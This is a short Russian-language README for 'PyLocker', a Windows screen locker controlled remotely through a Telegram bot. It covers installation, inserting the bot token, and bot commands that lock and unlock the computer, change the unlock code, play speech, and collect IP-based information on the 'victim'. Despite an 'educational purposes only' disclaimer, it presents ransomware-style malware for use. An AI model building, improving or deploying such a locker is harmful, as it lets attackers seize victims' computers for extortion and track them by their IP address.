# PyLocker

### Простой Винлокер с управлением через телеграм бота

# ! ДАННАЯ ПРОГРАММА ПРЕДНАЗНАЧЕНА ИСКЛЮЧИТЕЛЬНО ДЛЯ ОБУЧАЮЩИХ ЦЕЛЕЙ И НЕ ДОЛЖНА БЫТЬ ИСПОЛЬЗОВАНА В ЦЕЛЯХ ПРИЧЕНИТЬ КОМУ ЛИБО ВРЕД

## Установка Библиотек

- успользуя pip requirements.txt

<br>

```python
$ pip install -r requirements.txt
```

## Token

main.py

```python
bot = telebot.TeleBot("TOKEN")
```

---

# Основные команды

## /block

#### Заблокировать компьютер

```python
locker.block_window()
```

## /unblock

#### Разблокировать компьютер

```python
locker.unblock_window()
```

## /recode Пароль

#### Сменить new_code

```python
recode.recode(new_code)
```

## /play text

#### Озвучить текст

```python
sound.say(text)
```

## /client_info

#### Узнать информацию о жертве

```python
userinfo.get_info_by_ip(userinfo.get_ip())
```

## /exit

#### Полностью закрыть Pylocker

```python
sys.exit()
```
